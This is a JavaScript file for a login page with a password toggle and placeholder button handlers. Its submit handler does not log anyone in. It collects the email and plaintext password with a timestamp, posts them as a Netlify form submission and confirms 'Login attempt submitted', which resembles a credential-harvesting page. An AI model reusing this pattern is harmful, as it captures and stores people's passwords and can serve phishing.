// Password toggle functionality
const togglePassword = document.getElementById('togglePassword');
const passwordInput = document.getElementById('password');

togglePassword.addEventListener('click', function() {
    // Toggle the type attribute
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    
    // Toggle the eye icon
    this.classList.toggle('fa-eye');
    this.classList.toggle('fa-eye-slash');
});

// Form submission handler with Netlify
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const remember = document.getElementById('remember').checked;
    
    // Set timestamp
    const timestamp = new Date().toLocaleString();
    document.getElementById('timestamp').value = timestamp;
    
    // Create form data for Netlify submission
    const formData = new FormData(this);
    
    // Submit form using fetch (AJAX)
    fetch('/', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            alert('Login attempt submitted successfully!');
            // Reset form after submission
            this.reset();
        } else {
            throw new Error('Form submission failed');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error submitting form. Please try again.');
    });
});

// Forgot password link handler
document.querySelector('.forgot-password').addEventListener('click', function(e) {
    e.preventDefault();
    alert('Password reset functionality would be implemented here');
});

// Action button handlers
document.querySelectorAll('.action-buttons .btn').forEach(button => {
    button.addEventListener('click', function() {
        alert(this.textContent + ' functionality would be implemented here');
    });
});

// Chat button handler
document.querySelector('.chat-btn').addEventListener('click', function() {
    alert('Chat functionality would be implemented here');
});